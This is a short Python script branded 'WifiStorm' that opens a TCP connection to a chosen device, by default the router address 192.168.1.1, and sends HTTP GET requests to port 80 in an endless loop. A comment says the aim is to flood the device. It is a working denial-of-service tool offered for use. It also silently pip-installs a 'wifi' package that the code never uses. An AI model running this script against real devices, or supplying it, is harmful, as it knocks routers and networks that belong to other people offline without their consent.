import sys
import subprocess
import getopt
import socket

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import wifi
except ImportError:
    install('wifi')

text = "\033[93m" + """

 __    __ _  __ _ __ _                       
/ / /\ \ (_)/ _(_) _\ |_ ___  _ __ _ __ ___  
\ \/  \/ / | |_| \ \| __/ _ \| '__| '_ ` _ \ 
 \  /\  /| |  _| |\ \ || (_) | |  | | | | | |
  \/  \/ |_|_| |_\__/\__\___/|_|  |_| |_| |_|
                                             

""" + "\033[0m"
print(text)

def main(argv):
    target_ip = "192.168.1.1" # default value for address
    try:
        opts, args = getopt.getopt(argv, "hi:", ["ip="])
    except getopt.GetoptError:
        print('script.py -i <IP address of the device>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('script.py -i <IP address of the device>')
            sys.exit()
        elif opt in ("-i", "--ip"):
            target_ip = arg

    port = 80 # The port to which the request will be sent

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, port))

    # Send multiple requests in a loop to flood the device with requests
    while True:
        request = "GET / HTTP/1.1\r\n\r\n" # The request you want to send
        sock.send(request.encode())

    sock.close()

if __name__ == "__main__":
    main(sys.argv[1:])
